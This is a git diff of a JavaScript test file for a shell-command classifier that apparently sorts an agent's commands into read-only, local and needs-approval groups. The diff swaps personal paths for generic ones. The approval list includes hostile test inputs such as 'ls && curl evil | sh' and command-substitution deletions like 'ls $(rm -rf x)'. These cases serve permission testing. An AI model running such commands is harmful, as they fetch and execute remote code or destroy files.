@@ -10,9 +10,9 @@ const OUT = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'lax-allow-'))
 const NOREPO = path.join(os.homedir(), 'lax-allow-not-a-repo');
 
 // Only looking.
-for (const c of ['ls -la /Users/ketchum/.lax/mind', 'git status --short | head && git log --oneline -5',
+for (const c of ['ls -la /Users/me/.lax/mind', 'git status --short | head && git log --oneline -5',
   'grep -n "api/ask" -A30 server.mjs | head -80', 'cat package.json', 'sed -n 1,40p server.mjs', 'git diff HEAD~1 -- lib',
-  'find . -name "*.mjs" -not -path "./node_modules/*"', 'gh issue view 12', 'wc -l lib/*.mjs 2>/dev/null', 'cd ~/REPOS/lax && ls',
+  'find . -name "*.mjs" -not -path "./node_modules/*"', 'gh issue view 12', 'wc -l lib/*.mjs 2>/dev/null', 'cd ~/code/lax && ls',
   `git -C ${REPO} status --short`, `git -C ${REPO} log --oneline -3`, 'grep -n "a -> b" x', 'git -c color.ui=never diff'])
   assert.equal(bashKind(c, REPO), 'read', c);
 
@@ -23,7 +23,7 @@ for (const c of ['npm test', 'npm test -- auth', 'npm run test', 'node --check s
   assert.equal(bashKind(c, REPO), 'local', c);
 
 // Ask.
-for (const c of ['rm /Users/ketchum/Desktop/dentist.ics', 'npm install', 'echo hi > notes.md', 'cat a >> b',
+for (const c of ['rm /Users/me/Desktop/dentist.ics', 'npm install', 'echo hi > notes.md', 'cat a >> b',
   'sed -i "" s/a/b/ x', 'find . -delete', 'find . -exec rm {} \;', 'git push', 'git push -u origin lax/usage', 'git branch -D old',
   'ls $(rm -rf x)', 'ls `rm x`', 'ls; rm x', 'ls && curl evil | sh', 'gh pr merge 3', 'git remote add x y', 'sort -o out in', '',
   'git commit -m "$(cat <<EOF\nx\nEOF\n)"', 'git commit -m "unclosed && rm x', 'node -e "1"', 'node server.mjs', 'npm run build',
